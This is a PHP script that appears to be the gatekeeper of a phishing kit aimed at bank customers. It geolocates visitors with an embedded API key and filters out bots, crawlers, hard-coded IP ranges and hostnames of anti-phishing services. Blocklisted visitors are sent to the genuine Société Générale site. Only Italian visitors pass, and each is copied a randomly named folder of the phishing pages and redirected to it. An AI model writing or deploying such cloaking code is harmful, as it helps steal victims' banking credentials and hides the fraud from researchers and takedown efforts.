<?php
session_start();
error_reporting(0);


include "./antibots1.php";
include "./antibots2.php";
function IP_TO_EARTH($ip){
$_URL         = "https://iptoearth.expeditedaddons.com?api_key=97YSI3Z5FQ816CH5MNEAV072WXOG8DBJ9T6P204K31UR4L&ip=$ip"; 
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_URL, $_URL);
$content = curl_exec($ch);
$response=json_decode($content, true);
return $response;
curl_close($ch);
}
function is_base64($data){
    if (preg_match('%^[a-zA-Z0-9/+]*={0,2}$%', $data)) {
       return true;
    } else {
       return false;
    }
}
function ipbetweenrange($needle, $start, $end) {
	foreach($start as $key => $star){
	  if((ip2long($needle) >= ip2long($star)) && (ip2long($needle) <= ip2long($end[$key]))) {
		return true;
	  }
	}
  return false;
}
function visitorip() {
	 if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])){$ip = $_SERVER["HTTP_CF_CONNECTING_IP"];}
	 else if (getenv('HTTP_CLIENT_IP')){$ip = getenv('HTTP_CLIENT_IP');}
     else if(getenv('HTTP_X_FORWARDED_FOR')) {$ip = getenv('HTTP_X_FORWARDED_FOR');}
     else if(getenv('HTTP_X_FORWARDED')) {$ip = getenv('HTTP_X_FORWARDED');}
     else if(getenv('HTTP_FORWARDED_FOR')) {$ip = getenv('HTTP_FORWARDED_FOR');}
     else if(getenv('HTTP_FORWARDED')) {$ip = getenv('HTTP_FORWARDED');}
     else if(getenv('REMOTE_ADDR')) {$ip = getenv('REMOTE_ADDR');}
     else {$ip = $_SERVER['HTTP_HOST'];}
	 $ip=explode(",",$ip);
	 return $ip[0];
}
function IS_BOT_CRAWLER() {
  return (
    isset($_SERVER['HTTP_USER_AGENT'])
    && preg_match('/bot|crawl|crawler|proxy|slurp|spider/i', $_SERVER['HTTP_USER_AGENT'])
  );
}
function IS_BOT($ip){
	$url="http://bot.myip.ms/$ip";
	$agent            = "Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_USERAGENT, $agent);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_URL, $url);
	$res = curl_exec($ch);
	// return $res;
	curl_close($ch);
	if (strpos($res, 'Bot on this IP address') == true) {
		return true;
	}else{
		return false;
	}
}
$ip=visitorip();
$response=IP_TO_EARTH($ip);
$ips = "./ips.txt";
$lines = file($ips, FILE_IGNORE_NEW_LINES);
$found = false;
foreach ($lines as $line){
    if (strpos($ip,$line) !== false){
        $found = true;
        break;
    }
}
if ($found){
	header("Location: https://particuliers.societegenerale.fr/");
}else{
	
include("./clean.php");
$ipstart = array(
"185.22.216.0",
"178.213.64.0",
"54.208.0.0",
"193.200.150.0",
"14.140.80.178",
"66.102.8.0",
"185.75.141.32",
"83.31.40.0",
"54.183.0.0",
"81.161.59.0",
"4.14.64.0",
"139.59.0.0",
"83.31.197.0",
"146.112.209.0",
"37.187.172.0",
"77.40.129.0",
"66.249.93.88",
"54.156.0.0"
);
$ipend = array(
"185.22.219.255",
"178.213.66.41",
"54.211.255.255",
"193.200.150.255",
"14.141.1.26",
"66.102.8.137",
"185.75.141.39",
"83.31.41.255",
"54.183.255.255",
"81.161.59.255",
"4.14.65.255",
"139.59.8.35",
"83.31.197.0",
"146.112.240.255",
"37.187.173.255",
"77.40.132.127",
"66.249.93.202",
"54.167.255.255"
);
$hostname = gethostbyaddr($ip);
$acchostsfile = "./Accepted_hosts.txt";
$acchosts = file_get_contents($hostsfile);
$rejhostsfile = "./Rejected_hosts.txt";
$rejhosts = file_get_contents($hostsfile);
$email="";
$hosts=array("6.ip-37-187-210.eu","AAubervilliers-552-1-8-1.w90-35.abo.wanadoo.fr", "dd14822.kasserver.com","webredir.vip.gandi.net","213.214-14-84.ripe.coltfrance.com","AAubervilliers-552-1-28-239.w90-35.abo.wanadoo.fr","ip-37-187-214.eu","c5ed02-LFbn-1-4335-134.w92-169.abo.wanadoo.fr","cnil-vip-prod1.accelance.net","195.141.39.62.rev.sfr.net","dyna51.laval.jouve-hdi.com","a104-84-200-216.deploy.static.akamaitechnologies.com","xvm-161-150.dc0.ghst.net","cache.prod.vdm.ext.dila.fr","service-public-2016.fr.prod.ext.dila.fr","xvm-165-182.dc0.ghst.net","LFbn-1-4335-134.w92-169.abo.wanadoo.fr","clu106.neoplus.adsl.tpnet.pl","blue3057.server-cp.com","ec2-54-211-193-207.compute-1.amazonaws.com","mta141032.isitphishing.org","mail.phishing-initiative.eu","crawl-112-170-187-194.qwant.com","mail.dev.phishing-initiative.net","84-52-15-51.rev.cloud.scaleway.com","11-46-15-51.rev.cloud.scaleway.com","crawl-109-170-187-194.qwant.com");
if(!IS_BOT_CRAWLER() && !IS_BOT($ip) && !in_array($hostname, $hosts) && !ipbetweenrange($hostname, $ipstart, $ipend) && $response["country_code"] == "IT"){
	if(false === strpos($acchosts,$hostname)) {
    file_put_contents($acchostsfile,"$hostname\n",FILE_APPEND);
	}
	$random=rand(0,100000);
	$md5=md5("$random");
	$base=base64_encode($md5);
	$dst=md5("$base");
	$dst = substr($dst, 0, 7);
	$dst=$hostname."-".$dst;
	$dst=str_replace("=", "", base64_encode($dst));
	function recurse_copy($src,$dst) {
		$dir = opendir($src); 
		@mkdir($dst); 
		while(false !== ( $file = readdir($dir)) ) {
			if (( $file != '.' ) && ( $file != '..' )) { 
				if ( is_dir($src . '/' . $file) ) {
					recurse_copy($src . '/' . $file,$dst . '/' . $file); 
				}else { 
					copy($src . '/' . $file,$dst . '/' . $file); 
				}
			}
		} 
		closedir($dir);
	} 
	$src="de";
	recurse_copy( $src, $dst );
	echo '
	<script>
		window.location="'.$dst.'/index.php?ip='.$ip.'";
	</script>
	';
	// echo "rak zin $ip";
}else{
	if(false === strpos($rejhosts,$hostname)) {
    file_put_contents($rejhostsfile,"$hostname\n",FILE_APPEND);
	}
	echo '
		<script>
			window.location="http://" + document.location.hostname;
		</script>
	';
}
	
	
}
?>